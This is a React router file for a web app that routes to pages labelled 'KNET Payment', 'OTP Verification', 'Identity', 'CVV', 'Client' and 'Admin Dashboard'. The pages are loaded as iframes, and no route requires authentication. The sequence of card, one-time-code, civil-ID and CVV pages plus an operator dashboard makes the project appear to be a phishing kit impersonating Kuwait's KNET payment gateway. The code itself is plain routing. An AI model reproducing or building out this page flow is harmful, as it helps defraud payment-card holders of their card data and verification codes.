import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import Home from "./pages/Home";
import HomeEn from "./pages/HomeEn";
import Pay from "./pages/Pay";
import PayEn from "./pages/PayEn";

// Wrapper components for HTML pages
const KnetPage = () => {
  return (
    <iframe
      src="/knet/knetpage.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="KNET Payment"
    />
  );
};

const VerPage = () => {
  return (
    <iframe
      src="/knet/ver.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="OTP Verification"
    />
  );
};

const HawetPage = () => {
  return (
    <iframe
      src="/hawety.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="Identity"
    />
  );
};

const CvvPage = () => {
  return (
    <iframe
      src="/cvv.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="CVV"
    />
  );
};

const ClientPage = () => {
  return (
    <iframe
      src="/client.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="Client"
    />
  );
};

const AdminPage = () => {
  return (
    <iframe
      src="/admin.html"
      style={{ width: '100%', height: '100vh', border: 'none' }}
      title="Admin Dashboard"
    />
  );
};
function Router() {
  // make sure to consider if you need authentication for certain routes
  return (
    <Switch>
      <Route path={"/"} component={Home} />
      <Route path={"/en"} component={HomeEn} />
      <Route path={"/pay"} component={Pay} />
      <Route path={"/pay-en"} component={PayEn} />
      <Route path={"/knet"} component={KnetPage} />
      <Route path={"/otp"} component={VerPage} />
      <Route path={"/identity"} component={HawetPage} />
      <Route path={"/cvv"} component={CvvPage} />
      <Route path={"/client"} component={ClientPage} />
      <Route path={"/admin"} component={AdminPage} />
      <Route path={"/404"} component={NotFound} />
      {/* Final fallback route */}
      <Route component={NotFound} />
    </Switch>
  );
}

// NOTE: About Theme
// - First choose a default theme according to your design style (dark or light bg), than change color palette in index.css
//   to keep consistent foreground/background color across components
// - If you want to make theme switchable, pass `switchable` ThemeProvider and use `useTheme` hook

function App() {
  return (
    <ErrorBoundary>
      <ThemeProvider
        defaultTheme="light"
      >
        <TooltipProvider>
          <Toaster />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
